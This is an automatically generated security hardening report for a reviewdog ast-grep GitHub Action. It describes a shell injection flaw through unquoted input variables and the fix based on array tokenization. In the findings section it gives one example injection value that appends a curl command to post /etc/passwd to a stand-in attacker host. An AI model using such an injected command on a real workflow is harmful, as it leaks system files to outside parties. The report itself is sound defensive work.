<!-- markdownlint-disable -->

# Hardening Report: reviewdog--action-ast-grep/v1.58.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **reviewdog--action-ast-grep/v1.58.3** was hardened automatically. 1 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b) violation: Unquoted shell variable expansions of untrusted data in script.sh. Two env vars sourced from `inputs.*` (workflow-controllable) are expanded without double-quoting, allowing shell metacharacter injection:
1. Line 48: `${INPUT_SG_FLAGS}` — sourced from `inputs.sg_flags`, used unquoted as additional flags to `ast-grep scan`. An attacker-controlled value like `; curl -d @/etc/passwd attacker.com` would be parsed by the shell.
2. Line 57: `${INPUT_REVIEWDOG_FLAGS}` — sourced from `inputs.reviewdog_flags`, used unquoted as additional flags to `reviewdog`. Same injection risk.
Neither uses the safe guarded form `${VAR:+"$VAR"}`. The `# shellcheck disable=SC2086` comment above the block suppresses the linter warning but does not mitigate the security risk.

Locations:

- `script.sh:48`
- `script.sh:57`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Fixed both unquoted variable expansions in script.sh:
1. `${INPUT_SG_FLAGS}` (line 48): Replaced with xargs-based bash array tokenization into `sg_flags`, expanded as `"${sg_flags[@]}"`.
2. `${INPUT_REVIEWDOG_FLAGS}` (line 57): Replaced with xargs-based bash array tokenization into `reviewdog_flags`, expanded as `"${reviewdog_flags[@]}"`. Pre-tokenized before the pipeline so reviewdog still reads from stdin (jq pipe).
Both arrays are guarded with `if [ -n "..." ]` to prevent empty-token injection. Removed the `# shellcheck disable=SC2086` comment since the issue is properly fixed.

